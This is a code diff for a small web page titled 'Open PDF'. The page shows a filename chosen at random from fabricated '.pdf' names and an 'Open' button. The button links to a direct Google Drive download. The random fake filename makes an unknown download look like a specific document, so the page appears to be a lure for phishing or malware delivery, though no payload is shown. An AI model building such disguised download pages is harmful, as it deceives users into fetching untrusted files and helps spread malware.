@@ -4,14 +4,51 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Open PDF</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #d3d3d3; /* Gray background */
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            border-radius: 10px;
+        }
+        .btn {
+            display: inline-block;
+            padding: 10px 20px;
+            font-size: 18px;
+            color: white;
+            background-color: #007bff;
+            text-decoration: none;
+            border-radius: 5px;
+        }
+        .btn:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
-    <button onclick="openPDF()">Open</button>
+    <div class="container">
+        <h2 id="filename">Loading...</h2>
 
+        <a class="btn" href="https://drive.google.com/uc?export=download&id=1nXqxmd61zwerOnAcnjBKzvRYMKBOMUL0" target="_blank">Open</a>
+    </div>
+    
     <script>
-        function openPDF() {
-            window.location.href = 'https://drive.google.com/uc?export=download&id=1nXqxmd61zwerOnAcnjBKzvRYMKBOMUL0';
-        }
+        // Generate a random filename
+        const filenames = [
+  "QQkKTDQvVsxcHNNSHqXHfwHxdEgoajCKPiRZmZPY.pdf",
+  "a3Kq8D1oJr9b1uX4BZT2.pdf",
+  "U1Dqx9L6vWc4sA3kGTzP.pdf",
+  "HsYz5XbNq7j9C5wF3PLa.pdf",
+  "FgW9o3RyW4cWxDkQpZTs.pdf"
+];
+        document.getElementById("filename").innerText = filenames[Math.floor(Math.random() * filenames.length)];
     </script>
 </body>
 </html>
